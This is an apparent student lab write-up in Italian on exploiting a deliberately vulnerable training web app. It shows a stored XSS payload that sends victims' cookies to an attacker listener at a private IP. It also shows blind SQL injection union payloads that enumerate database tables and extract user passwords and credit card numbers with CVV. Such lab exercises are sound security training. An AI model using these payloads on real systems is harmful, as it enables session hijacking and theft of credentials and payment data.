-----------XSS Stored--------------

Il textbox per inserire il messaggio è limitato in html ad 50 caratteri,
per risolvere ciò è bastato modificarlo tramite l'editor del browser (Immagine [01])

Ovviato questo problema è bastato inserire qualsiasi cosa nel box del nome e il seguente come messaggio:

<script>window.location="http://192.168.50.100:12345/?cookie"+document.cookie</script>

Con un server in ascolto sulla porta 12345 possiamo ottenere il risultato di (Immagine [02])

-------SQL Injection Blind---------

Ipotizzando di non conoscere i nomi delle tabelle interessate, 
possiamo ottenere una lista di tutte le tabelle nel database,
ottenendo i campi table_schema e table_name, con il seguente comando:+

%' union select table_schema, table_name from information_schema.tables#

(Immagine [03])
Da qua possiamo ricavare qualsiasi tabella di nostro interesse
E cambiando il where dal seguente comando possiamo ottenere informazioni pure sulle tabelle

%' and 1=0 union select table_name, column_name from information_schema.columns where table_name = 'users' #

(Immagine [04])
Conoscendo i nomi della tabella e delle sue colonne possiamo ottenere tutte le informazioni che vogliamo dal database,
con comandi come 

%' union select user, password from users#
(Immagine [05])

Oppure
%' union select ccnumber, ccv from owasp10.credit_cards#
(Immagine [06])